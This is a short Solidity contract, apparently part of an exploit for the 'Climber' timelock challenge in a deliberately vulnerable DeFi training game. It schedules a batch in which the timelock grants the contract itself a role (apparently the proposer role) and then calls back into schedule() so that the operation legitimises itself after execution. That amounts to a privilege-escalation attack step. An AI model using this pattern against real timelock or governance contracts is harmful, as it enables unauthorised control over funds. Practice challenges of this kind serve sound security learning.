// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;
interface IClimberTimelock {
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}
contract Scheduler {
    address _timelockContractAddress;
    address _vaultAddress;

    constructor(address timelockContractAddress, address vaultAddress){
        _timelockContractAddress = timelockContractAddress;
        _vaultAddress = vaultAddress;
    }   

    function schedule() external {
        bytes32 role = 0xb09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1;
        bytes[] memory data = new bytes[](2);
        
        data[0] = abi.encodeWithSignature("grantRole(bytes32,address)",role , address(this));
        data[1] = abi.encodeWithSignature("schedule()");

        address[] memory tos = new address[](2);

        tos[0] = _timelockContractAddress;
        tos[1] = address(this);

        uint256[] memory values = new uint256[](2);
        values[0] = 0;
        values[1]= 0;
        IClimberTimelock(_timelockContractAddress).schedule(tos,values,data,
            0x0000000000000000000000000000000000000000000000000000000000000040
        );

    }


}